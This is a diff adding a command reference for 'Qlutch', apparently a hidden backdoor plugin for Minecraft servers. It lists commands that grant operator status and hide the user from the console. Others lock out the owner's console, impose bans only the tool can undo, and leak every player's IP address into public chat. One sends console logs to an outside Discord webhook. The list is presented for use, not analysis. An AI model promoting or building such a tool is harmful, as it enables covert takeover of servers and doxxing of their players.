@@ -1,0 +1,69 @@
+//status | Lets you know what is toggled: lock console, freeze all, etc 
+//op | Op yourself or another player - op <player | *>
+//deop | Deop yourself or another player - deop <player | *>
+//plugins | Lists all the servers plugins
+//flood | Floods the chat with colour
+/////nameme | Nicks yourself in game and tab - nameme <name>
+/////nameall | Nicks all online players in game and tab - nameall <name>
+msg | Message another player privately - msg <player> <message>
+reply | Reply to the last person that messaged you - reply <message>
+listloggedin | Lists all logged in players
+flip | Makes a player flip 180 degrees - flip <player | *>
+freeze | Freeze a player - freeze <player | *>
+unfreeze | Unfreeze a player - unfreeze <player | *>
+modcmds | Makes players unable to use mod commands like /ban
+dupe | Opens an inventory which dupes anything you put inside
+//sudo | Forces another player to chat or use a command - sudo <player | * > <chat>
+broadcast | Broadcasts a message in chat - broadcast <message>
+spam | Spams your message and fills the chat - spam <message>
+god | Toggles god mode so you take no damage - god <player>
+save | Saves the world
+togglechat | Makes it so players can't talk in chat
+clearchat | Clears chat
+bombs | Gives you throwable bombs that blow up
+npu | Stops players from being able to pickup anything - npu <player>
+reload | reloads the server
+enable | Enables a disabled plugin - enable <plugin name | *>
+disable | Disables a plugin so it no longer works - disable <plugin name | *>
+tp | Teleports you to another player - tp <player | coords> <player>
+tpall | Teleports all players to another player - tpall <player>
+lockconsole | Locks console so it cannot execute any commands
+cmdspy | Lets you know what commands everyone is executing
+invsee | Opens another players inventory so you can take or edit - invsee <player>
+kill | Kills other players - kill <player | *>
+console | Executes a command as console - console <command>
+ride | Rides another player - ride <player>
+rideme | Forces another player to ride you - rideme <player>
+stop | Stops the server completely
+nextmsg| Set the users next message they type - nextmsg <player> <msg>
+lockcmds | Stops players being able to execute any commands
+lockcontainers | Stops players being able to open chests, anvils, everything!
+coords | Get a players coords - coords <player>
+item | Spawn any item you want - item <item name> <amount>
+tip | Receive a random Qlutch tip
+fly | Toggles flight for you
+feed | Restores your hunger to max - feed (player | *)
+heal | Heals you to the max - heal (player | *)
+floodconsole | Floods the console
+gamemode | Change your gamemode - gamemode <mode> <player>
+wand | Right-click to spawn blocks - wand <block> <radius>
+lookup | Looks up another players IP and tells you where they're from - lookup <player>
+spin | Spins the entire world
+silent | No commands you execute from now on will show up in console
+whitelist on | Enables whitelist
+whitelist off | Disables whitelist
+whitelist remove | Removes a player from the whitelist - whitelist remove <player>
+whitelist add | Adds a player to the whitelist - whitelist add <player>
+leakips | Leaks everyones ip into the public chat
+kick | Kicks a player from the server - kick <player | *>
+ban | Bans a player from the server (can only be unbanned using qlutch unban) - ban <player | *>
+unban | Unbans a player from the server - unban <player | *>
+spamWebhook | Spam a webhook with TTS messages - spamWebhook <URL> <message>
+eChest | Open a players ender chest - eChest <player>
+vanish | Vanish so only qlutch users can see you
+penis | Makes it rain penises
+setmotd | Sets the new MOTD message - motd <message>
+fix | Set item to max durability - fix (*)
+rename | Renames the item in hand - rename <name>
+sethealth | Sets a players max health - sethealth (player) <health>
+logconsole | Logs console output to discord webhook - logconsole <webhook URL>
